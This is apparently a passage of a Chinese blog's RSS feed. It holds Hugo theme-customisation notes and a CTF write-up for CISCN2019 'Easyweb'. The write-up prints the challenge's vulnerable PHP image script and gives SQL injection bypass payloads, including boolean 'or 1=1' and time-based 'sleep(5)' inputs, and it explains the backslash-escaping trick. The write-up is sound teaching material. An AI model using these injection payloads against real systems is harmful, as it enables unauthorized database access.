&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;website&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;https://mantyke.icu/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;image&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;mantyke.png&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;我们会一起遇见鲸鱼吗？&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;友情链接2&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;website&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;image&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;代码块&#34;&gt;代码块&lt;/h3&gt;
&lt;p&gt;首先，是代码高亮设置&lt;/p&gt;
&lt;p&gt;打开项目根目录下的 &lt;code&gt;config.yaml&lt;/code&gt;，在highlight中加入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;style : autumn  # 样式参考https://xyproto.github.io/splash/docs/all.html
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我很喜欢白天用perldoc夜间用dracula，现在有个问题是怎么能做到切换。由于暂时无法解决我先一直用着dracula。&lt;/p&gt;
&lt;p&gt;然后是这个大块块不太顺眼，直白白的边框实在是难看hhh。在F:\ProbeN1\myblog\assets\scss\custom.scss里添加css代码进行修改，这里我加了一个灰色的边框：&lt;/p&gt;
&lt;p&gt;早就看这个代码块不太顺眼，那个直白白的边框实在是难看hhh。在F:\ProbeN1\myblog\themes\hugo-theme-stack\assets\scss\custom.scss里添加css代码进行修改&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;代码块&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#50fa7b&#34;&gt;highlight&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;pre&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;font-family&lt;/span&gt;: Consolas;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;border-style&lt;/span&gt;: &lt;span style=&#34;color:#ff79c6&#34;&gt;solid&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;border-width&lt;/span&gt;: &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#8be9fd&#34;&gt;px&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;border-color&lt;/span&gt;: (&lt;span style=&#34;color:#bd93f9&#34;&gt;255&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;255&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>[CISCN2019总决赛Day2Web1]Easyweb</title>
        <link>https://proben1.github.io/2022/ciscn2019%E6%80%BB%E5%86%B3%E8%B5%9Bday2web1easyweb/</link>
        <pubDate>Thu, 05 May 2022 19:11:01 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/ciscn2019%E6%80%BB%E5%86%B3%E8%B5%9Bday2web1easyweb/</guid>
        <description>&lt;h1 id=&#34;ciscn2019-总决赛-day2-web1easyweb&#34;&gt;[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/h1&gt;
&lt;p&gt;sql绕过&lt;/p&gt;
&lt;p&gt;文件上传短标签绕过&lt;/p&gt;
&lt;p&gt;信息收集&lt;/p&gt;
&lt;p&gt;/robots.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-agent: *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disallow: *.php.bak
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;user.php&lt;/p&gt;
&lt;p&gt;image.php&lt;/p&gt;
&lt;p&gt;其中image.php.bak存在&lt;/p&gt;
&lt;p&gt;在其中又发现config.php&lt;/p&gt;
&lt;p&gt;/.DS_Store&lt;/p&gt;
&lt;p&gt;没东西&lt;/p&gt;
&lt;p&gt;image.php.bak&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;config.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_query(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$con&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_fetch_array(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;,MYSQLI_ASSOC);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type: image/jpeg&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readfile(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;绕过：（这里不知道为啥必须要%23而#不行，好像是#号url不会解析）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id=\0&amp;amp;path= or 1=1 %23
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id=\0&amp;amp;path= or sleep(5) %23
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输入：id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;\0&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&lt;/span&gt;path&lt;span style=&#34;color:#ff79c6&#34;&gt;=%&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;201&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;23&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\\0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
